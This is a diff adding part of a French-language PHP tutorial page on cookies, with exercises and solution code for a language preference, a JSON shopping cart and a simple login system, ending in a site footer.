+        &lt;h1&gt;&lt;?= $messages[$langue] ?&gt;&lt;/h1&gt;
+        
+        &lt;!-- Formulaire pour changer la langue --&gt;
+        &lt;form method="post" class="mt-4"&gt;
+            &lt;div class="mb-3"&gt;
+                &lt;label class="form-label"&gt;Changer la langue:&lt;/label&gt;
+                &lt;select name="langue" class="form-select"&gt;
+                    &lt;option value="fr" &lt;?= $langue === 'fr' ? 'selected' : '' ?&gt;&gt;Français&lt;/option&gt;
+                    &lt;option value="en" &lt;?= $langue === 'en' ? 'selected' : '' ?&gt;&gt;English&lt;/option&gt;
+                &lt;/select&gt;
+            &lt;/div&gt;
+            &lt;button type="submit" class="btn btn-primary"&gt;Enregistrer&lt;/button&gt;
+        &lt;/form&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+                                    
+                                    <h6 class="mt-3">Explications :</h6>
+                                    <ol>
+                                        <li>On commence par vérifier si le formulaire a été soumis via POST</li>
+                                        <li>Si oui, on stocke la langue choisie dans un cookie</li>
+                                        <li>Nous effectuons une redirection pour éviter que le formulaire soit soumis à nouveau lors d'un rechargement</li>
+                                        <li>Un tableau associatif stocke les messages dans différentes langues</li>
+                                        <li>L'opérateur de fusion null (??) permet d'utiliser une langue par défaut si le cookie n'existe pas</li>
+                                        <li>La langue est utilisée à la fois pour l'attribut lang de HTML et pour afficher le message correspondant</li>
+                                    </ol>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="card mb-3">
+                        <div class="card-header bg-primary text-white">Exercice 2 : Panier d'achat</div>
+                        <div class="card-body">
+                            <h5>Objectif pédagogique :</h5>
+                            <p>Apprendre à stocker des structures de données complexes dans les cookies et à les manipuler.</p>
+                            
+                            <h5>Instructions :</h5>
+                            <p>Implémentez un panier simple qui :</p>
+                            <ol>
+                                <li>Stocke les articles ajoutés dans un cookie (format JSON)</li>
+                                <li>Affiche le contenu du panier</li>
+                                <li>Permet de vider le panier</li>
+                            </ol>
+                            
+                            <h5>Aide au développement :</h5>
+                            <ul>
+                                <li>Utilisez <code>json_encode()</code> pour convertir un tableau PHP en chaîne JSON</li>
+                                <li>Utilisez <code>json_decode()</code> pour convertir la chaîne JSON en tableau PHP</li>
+                                <li>N'oubliez pas de sécuriser les entrées avec <code>htmlspecialchars()</code></li>
+                                <li>Pensez à actualiser la valeur en mémoire avec <code>$_COOKIE['panier']</code></li>
+                            </ul>
+                            
+                            <div class="mt-3">
+                                <a href="exercice2.php" class="btn btn-success mt-2" target="_blank">Voir la solution</a>
+                                <button class="btn btn-outline-primary ms-2" type="button" data-bs-toggle="collapse" data-bs-target="#solution2">
+                                    Afficher le code de la solution
+                                </button>
+                            </div>
+                            
+                            <div class="collapse mt-3" id="solution2">
+                                <div class="card card-body bg-light">
+                                    <h6>Solution proposée :</h6>
+                                    <pre><code class="language-php">&lt;?php
+// Initialisation
+session_start();
+
+// Action pour ajouter un article
+if(isset($_POST['ajouter_article']) && !empty($_POST['article'])) {
+    // On récupère le panier existant ou on en crée un nouveau
+    $panier = isset($_COOKIE['panier']) ? json_decode($_COOKIE['panier'], true) : [];
+    
+    // On ajoute le nouvel article
+    $article = htmlspecialchars($_POST['article']);
+    $panier[] = $article;
+    
+    // On sauvegarde le panier mis à jour dans un cookie (valide pour 1 jour)
+    setcookie('panier', json_encode($panier), time() + 86400, '/');
+    
+    // Pour une mise à jour immédiate de l'affichage
+    $_COOKIE['panier'] = json_encode($panier);
+}
+
+// Action pour vider le panier
+if(isset($_POST['vider_panier'])) {
+    // On supprime le cookie en définissant une date d'expiration passée
+    setcookie('panier', '', time() - 3600, '/');
+    
+    // On vide également la valeur en mémoire
+    $_COOKIE['panier'] = null;
+}
+
+// Récupération du panier pour affichage
+$panier = isset($_COOKIE['panier']) ? json_decode($_COOKIE['panier'], true) : [];
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang="fr"&gt;
+&lt;head&gt;
+    &lt;meta charset="UTF-8"&gt;
+    &lt;title&gt;Exercice Panier d'Achat&lt;/title&gt;
+    &lt;link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class="container mt-5"&gt;
+        &lt;h1&gt;Mon Panier d'Achat&lt;/h1&gt;
+        
+        &lt;!-- Formulaire pour ajouter un article --&gt;
+        &lt;div class="card mb-4"&gt;
+            &lt;div class="card-header bg-primary text-white"&gt;
+                Ajouter un article
+            &lt;/div&gt;
+            &lt;div class="card-body"&gt;
+                &lt;form method="post" class="d-flex"&gt;
+                    &lt;input type="text" name="article" class="form-control me-2" placeholder="Nom de l'article" required&gt;
+                    &lt;button type="submit" name="ajouter_article" class="btn btn-success"&gt;Ajouter&lt;/button&gt;
+                &lt;/form&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+        
+        &lt;!-- Affichage du contenu du panier --&gt;
+        &lt;div class="card"&gt;
+            &lt;div class="card-header bg-info text-white"&gt;
+                Contenu du Panier
+            &lt;/div&gt;
+            &lt;div class="card-body"&gt;
+                &lt;?php if(empty($panier)): ?&gt;
+                    &lt;p class="text-muted"&gt;Votre panier est vide.&lt;/p&gt;
+                &lt;?php else: ?&gt;
+                    &lt;ul class="list-group"&gt;
+                        &lt;?php foreach($panier as $article): ?&gt;
+                            &lt;li class="list-group-item"&gt;&lt;?= $article ?&gt;&lt;/li&gt;
+                        &lt;?php endforeach; ?&gt;
+                    &lt;/ul&gt;
+                    
+                    &lt;div class="mt-3"&gt;
+                        &lt;form method="post"&gt;
+                            &lt;button type="submit" name="vider_panier" class="btn btn-danger"&gt;Vider le panier&lt;/button&gt;
+                        &lt;/form&gt;
+                    &lt;/div&gt;
+                &lt;?php endif; ?&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+        
+        &lt;div class="mt-4"&gt;
+            &lt;a href="index.html" class="btn btn-outline-primary"&gt;Retour au cours&lt;/a&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+                                    
+                                    <h6 class="mt-3">Explications :</h6>
+                                    <ol>
+                                        <li>Nous utilisons <code>json_encode()</code> et <code>json_decode()</code> pour stocker un tableau dans un cookie</li>
+                                        <li>Le panier est stocké sous forme de tableau associatif et converti en JSON</li>
+                                        <li>La fonction <code>htmlspecialchars()</code> est utilisée pour sécuriser les données</li>
+                                        <li>On met à jour la valeur en mémoire (<code>$_COOKIE['panier']</code>) pour un affichage immédiat</li>
+                                        <li>Pour vider le panier, on utilise une date d'expiration dans le passé</li>
+                                        <li>L'interface utilisateur change en fonction de l'état du panier (vide ou avec des articles)</li>
+                                    </ol>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="card mb-3">
+                        <div class="card-header bg-primary text-white">Exercice 3 : Système de connexion simple</div>
+                        <div class="card-body">
+                            <h5>À vous de jouer !</h5>
+                            <p>Créez un système de connexion basique qui :</p>
+                            <ol>
+                                <li>Permet à un utilisateur de se connecter avec un nom d'utilisateur et un mot de passe prédéfinis</li>
+                                <li>Stocke l'état de connexion dans un cookie</li>
+                                <li>Affiche différentes informations selon que l'utilisateur est connecté ou non</li>
+                                <li>Inclut une option "Se souvenir de moi" qui prolonge la durée du cookie</li>
+                                <li>Permet la déconnexion</li>
+                            </ol>
+                            
+                            <div class="alert alert-info mt-3">
+                                <h6>Conseils :</h6>
+                                <ul class="mb-0">
+                                    <li>Utilisez deux durées différentes pour le cookie: courte sans "Se souvenir de moi", longue avec</li>
+                                    <li>N'enregistrez pas le mot de passe dans le cookie, seulement un identifiant de session</li>
+                                    <li>Pensez à la sécurité : utilisez HttpOnly et Secure si possible</li>
+                                    <li>Bonus : chiffrez les données stockées dans le cookie</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="mt-4">
+                        <p class="lead">Ces exercices vous ont permis de mettre en pratique les concepts abordés dans ce cours. N'hésitez pas à les modifier ou à créer vos propres variations pour approfondir votre compréhension.</p>
+                        
+                        <h5>Pour aller plus loin :</h5>
+                        <ul>
+                            <li>Combinez cookies et sessions pour créer un système d'authentification plus robuste</li>
+                            <li>Expérimentez avec le flag <code>SameSite</code> pour comprendre son impact sur le comportement des cookies</li>
+                            <li>Créez une bannière de consentement aux cookies conforme au RGPD</li>
+                        </ul>
+                    </div>
+                </section>
+            </div>
+        </div>
+    </div>
+
+    <footer class="bg-dark text-white py-4 mt-5">
+        <div class="container text-center">
+            <p>&copy; 2025 Cookies en PHP - Formation PHP</p>
+            <p>
+                Réalisé par : <strong>CodeWithEase</strong>
+                <a href="https://wa.me/212614454323" class="text-white ms-2" target="_blank">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-whatsapp me-1" viewBox="0 0 16 16">
+                        <path d="M13.601 2.326A7.854 7.854 0 0 0 7.994 0C3.627 0 .068 3.558.064 7.926c0 1.399.366 2.76 1.057 3.965L0 16l4.204-1.102a7.933 7.933 0 0 0 3.79.965h.004c4.368 0 7.926-3.558 7.93-7.93A7.898 7.898 0 0 0 13.6 2.326zM7.994 14.521a6.573 6.573 0 0 1-3.356-.92l-.24-.144-2.494.654.666-2.433-.156-.251a6.56 6.56 0 0 1-1.007-3.505c0-3.626 2.957-6.584 6.591-6.584a6.56 6.56 0 0 1 4.66 1.931 6.557 6.557 0 0 1 1.928 4.66c-.004 3.639-2.961 6.592-6.592 6.592zm3.615-4.934c-.197-.099-1.17-.578-1.353-.646-.182-.065-.315-.099-.445.099-.133.197-.513.646-.627.775-.114.133-.232.148-.43.05-.197-.1-.836-.308-1.592-.985-.59-.525-.985-1.175-1.103-1.372-.114-.198-.011-.304.088-.403.087-.088.197-.232.296-.346.1-.114.133-.198.198-.33.065-.134.034-.248-.015-.347-.05-.099-.445-1.076-.612-1.47-.16-.389-.323-.335-.445-.34-.114-.007-.247-.007-.38-.007a.729.729 0 0 0-.529.247c-.182.198-.691.677-.691 1.654 0 .977.71 1.916.81 2.049.098.133 1.394 2.132 3.383 2.992.47.205.84.326 1.129.418.475.152.904.129 1.246.08.38-.058 1.171-.48 1.338-.943.164-.464.164-.86.114-.943-.049-.084-.182-.133-.38-.232z"/>
+                    </svg>
+                    Contactez-nous
+                </a>
+            </p>
+        </div>
+    </footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
